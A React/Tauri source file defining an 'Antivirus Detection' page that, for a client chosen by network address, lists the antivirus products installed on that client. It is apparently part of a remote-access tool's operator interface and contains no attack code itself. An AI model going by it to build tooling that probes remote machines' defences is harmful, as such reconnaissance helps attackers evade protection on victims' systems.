import React, { useEffect, useState } from "react";
import { listen } from "@tauri-apps/api/event";
import { useParams } from "react-router-dom";
import AVList from "../components/AVList";

const AVDetection: React.FC = () => {
  const { addr } = useParams<{ addr: string }>();
  const [clientInfo, setClientInfo] = useState<any>(null);

  useEffect(() => {
    listen("close_window", () => {
      window.close();
    });
  }, []);

  return (
    <div className="h-screen bg-[#0d1117] text-white overflow-auto p-6">
      <div className="mx-auto max-w-6xl">
        <h1 className="text-3xl font-bold mb-6">Antivirus Detection</h1>
        <p className="text-gray-400 mb-8">
          Retrieve information about antivirus products installed on the client
        </p>
        
        <AVList addr={addr} />
      </div>
    </div>
  );
};

export default AVDetection; 